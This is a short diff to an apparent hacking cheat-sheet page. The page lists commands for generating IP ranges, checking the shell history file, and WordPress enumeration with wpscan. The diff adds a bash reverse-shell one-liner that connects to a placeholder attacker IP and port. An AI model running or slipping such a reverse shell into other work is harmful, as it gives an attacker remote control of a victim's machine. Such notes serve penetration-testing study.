@@ -10,6 +10,7 @@ usefull tips and tools for hacking
 <ul>
   <li> create a file with a range of ip addresses: seq -f "10.10.10.%g" 1 254 > ip.txt
   <li> or use prips 10.0.0.0/23 > ip.txt (first install prips: apt install prips)
+  <li>echo  $HISTFILE to check the history file location
 </ul>
 
 <b>Port scan commands</b>
@@ -26,4 +27,8 @@ usefull tips and tools for hacking
   <li> 
 </ul>
     
-echo  $HISTFILE to check the history file location
+<b>Shell</b>
+<ul>
+  <li> wpscan -u URL -eu -ep -et
+  <li> bash -c 'bash -i >& /dev/tcp/YOURIP/PORT 0>&1'
+</ul>
